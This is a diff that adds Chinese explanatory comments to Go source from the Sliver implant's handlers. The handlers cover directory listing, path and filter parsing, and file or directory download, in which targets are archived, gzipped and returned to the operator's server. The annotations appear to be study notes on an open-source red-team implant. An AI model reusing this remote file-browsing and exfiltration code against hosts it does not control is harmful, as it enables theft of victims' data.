@@ -69,6 +69,7 @@ type RportFwdHandler func(*sliverpb.Envelope, *transports.Connection)
 // -----------------------------------------------------
 // -----------------------------------------------------
 
+// 并没有功能的执行代码
 func pingHandler(data []byte, resp RPCResponse) {
 	ping := &sliverpb.Ping{}
 	err := proto.Unmarshal(data, ping)
@@ -85,6 +86,13 @@ func pingHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+// 解析出path和filter
+// 可能传入的情况有四种 (传入前对输入做了处理，保证目录的结尾一定是/)
+// 传入值           path      filter
+// .               .         ""
+// 123.txt         .         123.txt
+// /home/          /home/    ""
+// /home/123.txt   /home/    123.txt
 func determineDirPathFilter(targetPath string) (string, string) {
 	// The filter
 	filter := ""
@@ -97,18 +105,23 @@ func determineDirPathFilter(targetPath string) (string, string) {
 		If the path passes the test to be a filter, then it is a filter
 		because paths are not valid filters.
 	*/
+	// 先判断传入的内容是否只有目录，如果是当前目录，则直接 path="." filter=""
 	if targetPath != "." {
 
 		// Check if the path contains a filter
 		// Test on a standardized version of the path (change any \ to /)
+		// 替换所有反斜杠为斜杠，方便后面的寻找
 		testPath := strings.Replace(targetPath, "\\", "/", -1)
 		/*
 			Cannot use the path or filepath libraries because the OS
 			of the client does not necessarily match the OS of the
 			implant
 		*/
+		// 寻找最后一个斜杠
 		lastSeparatorOccurrence := strings.LastIndex(testPath, "/")
 
+		// 如果没有找到，代表当前所传入的并不是一个路径，那么path="." filter=传入的内容
+		// 如果找到，代表当前是一个目录，然后将最后一个斜杠，前面的内容作为路径path(包含斜杠)，后面的内容作为filter
 		if lastSeparatorOccurrence == -1 {
 			// Then this is only a filter
 			filter = targetPath
@@ -128,6 +141,7 @@ func determineDirPathFilter(targetPath string) (string, string) {
 	return path, filter
 }
 
+// 判断当前路径是不是一个目录
 func pathIsDirectory(path string) bool {
 	fileInfo, err := os.Stat(path)
 	if err != nil {
@@ -137,6 +151,8 @@ func pathIsDirectory(path string) bool {
 	}
 }
 
+// 列目录，可以对文件进行过滤
+// 比较好的一点是，如果文件是link类型的，则会去获取所link的真实路径
 func dirListHandler(data []byte, resp RPCResponse) {
 	dirListReq := &sliverpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
@@ -155,12 +171,14 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	} else {
 		targetPath = dirListReq.Path
 	}
-
+	// 上面判断是否是Dir，就是为这里做铺垫
+	// 如果是则在最后补/
 	path, filter := determineDirPathFilter(targetPath)
 
 	dir, files, err := getDirList(path)
 
 	// Convert directory listing to protobuf
+	// 回传结果时，将当前的时区也返回回去了
 	timezone, offset := time.Now().Zone()
 	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
 	if err == nil {
@@ -187,6 +205,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 
 		if match {
 			// Check if this is a symlink, and if so, add the path the link points to
+			// 判断当前文件是否是ModeSymlink，如果是就获取真实的文件路径
 			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
 				linkPath, err = filepath.EvalSymlinks(path + fileInfo.Name())
 				if err != nil {
@@ -205,9 +224,9 @@ func dirListHandler(data []byte, resp RPCResponse) {
 				time itself.  We can change the format of the time displayed in the client
 				and not have to worry about having to update implants.
 				*/
-				ModTime: fileInfo.ModTime().Unix(),
-				Mode:    fileInfo.Mode().String(),
-				Link:    linkPath,
+				ModTime: fileInfo.ModTime().Unix(), // 修改时间
+				Mode:    fileInfo.Mode().String(),  // 文件类型
+				Link:    linkPath,                  // 如果是ModeSymlink的话，则这里是真实的路径
 			})
 		}
 	}
@@ -217,6 +236,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+// 返回绝对路径和目录中的内容
 func getDirList(target string) (string, []os.FileInfo, error) {
 	dir, err := filepath.Abs(target)
 	if err != nil {
@@ -225,6 +245,7 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 		// {{end}}
 		return "", nil, err
 	}
+	// 目录存在，进入判断
 	if _, err := os.Stat(dir); !os.IsNotExist(err) {
 		files, err := ioutil.ReadDir(dir)
 		return dir, files, err
@@ -369,6 +390,9 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+// recurse递归
+// 文件直接返回
+// 目录，递归，打包压缩，返回
 func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, int, int, error) {
 	/*
 		Combine the path and filter to see if the user wants
@@ -378,6 +402,7 @@ func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, in
 	if err != nil {
 		return nil, false, 0, 1, err
 	}
+	// 如果是一个文件，直接读取，返回
 	if err == nil && !fileInfo.IsDir() {
 		// Then this is a single file
 		rawData, err := os.ReadFile(path + filter)
@@ -396,6 +421,8 @@ func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, in
 }
 
 // Send a file back to the hive
+// 文件或者目录的下载
+// 目录会递归，然后打包压缩
 func downloadHandler(data []byte, resp RPCResponse) {
 	var rawData []byte
 
@@ -442,6 +469,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 			Err: fmt.Sprintf("%v", err),
 		}
 	} else {
+		// 压缩处理
 		gzipData := bytes.NewBuffer([]byte{})
 		gzipWrite(gzipData, rawData)
 		download = &sliverpb.Download{
@@ -725,6 +753,7 @@ func reconfigureHandler(data []byte, resp RPCResponse) {
 
 // ---------------- Data Encoders ----------------
 
+// 压缩
 func gzipWrite(w io.Writer, data []byte) error {
 	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
 	if err != nil {
@@ -735,6 +764,7 @@ func gzipWrite(w io.Writer, data []byte) error {
 	return err
 }
 
+// 解压缩
 func gzipRead(data []byte) ([]byte, error) {
 	bytes.NewReader(data)
 	reader, err := gzip.NewReader(bytes.NewReader(data))
@@ -749,6 +779,7 @@ func gzipRead(data []byte) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
+// 对UNC、Windows、Linux、Mac的路径进行处理
 func standarizeArchiveFileName(path string) string {
 	// Change all backslashes to forward slashes
 	var standardFilePath string = strings.ReplaceAll(path, "\\", "/")
@@ -762,11 +793,14 @@ func standarizeArchiveFileName(path string) string {
 		Tried with filepath.VolumeName, but that function
 		does not work reliably with Windows paths
 	*/
+	// 网络路径判断
 	if strings.HasPrefix(standardFilePath, "//") {
 		// If this a UNC path, filepath.Rel is not going to work
 		return standardFilePath[2:]
 	} else {
 		// Calculate a path relative to the root
+		// SplitN分隔为几块
+		// /root/123 会被分割为 ""和"root/123"
 		pathParts := strings.SplitN(standardFilePath, "/", 2)
 		if len(pathParts) < 2 {
 			// Then something is wrong with this path
@@ -776,6 +810,8 @@ func standarizeArchiveFileName(path string) string {
 		basePath := pathParts[0]
 		fileRelPath := pathParts[1]
 
+		// Mac Linux的basePath会为"" 直接返回
+		// 下面处理: 的，是专门为Windows准备的
 		if basePath == "" {
 			// If base path is blank, that means it started with / and / is the root
 			return fileRelPath
@@ -794,6 +830,7 @@ func standarizeArchiveFileName(path string) string {
 	}
 }
 
+// 对目录进行tar、gzip处理，将其处理为io.Writer，并没有真正做压缩
 func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, int, error) {
 	zipWriter := gzip.NewWriter(buf)
 	tarWriter := tar.NewWriter(zipWriter)
@@ -809,6 +846,7 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 		Even though resolving the symlink first is not necessary on *nix, it does not hurt
 		and will make it so that we do not have to detect if we are on Windows.
 	*/
+	// Lstat不会进行符号链接
 	pathInfo, err := os.Lstat(path)
 	if err != nil {
 		return readFiles, unreadableFiles, err
@@ -833,18 +871,22 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 		If we are not recursing, then read the directory without worrying about
 		subdirectories.
 	*/
+	// 遍历或当前，都会进行过滤然后添加
+	// link所指向的
 	if !recurse {
 		testPath := strings.ReplaceAll(path, "\\", "/")
 		directory, err := os.Open(path)
 		if err != nil {
 			return readFiles, unreadableFiles, err
 		}
+		// 只列出当前目录下的所有文件
 		directoryFiles, err := directory.Readdirnames(0)
 		directory.Close()
 		if err != nil {
 			return readFiles, unreadableFiles, err
 		}
 
+		// 对文件进行过滤
 		for _, fileName := range directoryFiles {
 			standardFileName := strings.ReplaceAll(testPath+fileName, "\\", "/")
 			if filter != "" {
@@ -857,6 +899,7 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 			}
 		}
 	} else {
+		// WalkDir不会进行符号链接
 		filepath.WalkDir(path, func(file string, d os.DirEntry, err error) error {
 			filePath := strings.ReplaceAll(file, "\\", "/")
 			if filter != "" {
@@ -900,6 +943,7 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 			}
 		}
 
+		// 打包文件，如果是Link类型的，会直接将所指向的文件打包
 		header, err := tar.FileInfoHeader(fi, file)
 		if err != nil {
 			unreadableFiles += 1
